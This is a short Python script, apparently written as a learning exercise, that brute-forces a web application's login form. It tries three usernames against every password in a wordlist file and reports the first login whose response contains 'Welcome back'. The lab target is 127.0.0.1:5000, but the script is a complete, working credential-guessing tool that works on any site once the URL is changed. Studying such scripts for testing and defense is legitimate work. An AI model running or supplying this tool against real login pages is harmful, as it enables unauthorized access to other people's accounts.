# As interfacing with a web application, we need to import requests module

import requests
import sys									# As there will be huge username and password, we don't want to print everything out to our buffer. So use "sys"

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "file_list.txt"
needle = "Welcome back"						# Welcome back is the indicator of successful login

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode() 		# whatever in the passwords_list just organized and identify as password
			sys.stdout.write("[X] Attempting user:password ... {} : {}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid password '{}' found for the user '{}'".format(password.decode(), username))
				sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for the '{}'".format(username))
		sys.stdout.write("\n")

